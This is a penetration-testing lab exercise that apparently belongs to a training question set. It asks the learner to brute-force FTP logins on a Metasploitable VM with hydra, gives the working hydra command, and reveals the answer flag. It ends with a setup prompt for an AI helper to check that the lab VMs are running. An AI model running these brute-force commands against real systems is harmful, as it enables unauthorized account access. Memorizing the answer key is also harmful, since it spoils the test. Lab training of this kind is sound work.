# Q096 — Hydra FTP Bruteforce

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / `192.168.52.130` |
| **Domain** | 05 — Credential Attacks |
| **Difficulty** | 🟡 Medium |
| **Tools** | `hydra`, `john`, `hashcat`, `crackmapexec`, `responder` |
| **Time budget** | 10–20 min |

---

## 📝 Question

Use hydra to brute FTP on Metasploitable for user `user` with rockyou. Report cracked password.

---

## 🎯 Flag Format

```
ftp_pass=<word>
```

Example: `ftp_pass=user`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

`hydra -l user -P rockyou.txt ftp://<ip>`
</details>

<details>
<summary>Hint 2</summary>

Metasploitable user account password = user.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
hydra -l user -P /usr/share/wordlists/fasttrack.txt ftp://192.168.52.129
```

Cracks `user:user`.

**Answer:** `ftp_pass=user`

📖 Ref: [tools/hydra.md](../../tools/hydra.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
1. Verify VMs running: ping 192.168.52.129 and ping 192.168.52.130 from 192.168.52.128.
2. Required services for this Q already up by default on the relevant target.
3. If something is down, restart it on the target VM.

Report back: "Lab ready for Q096".
```
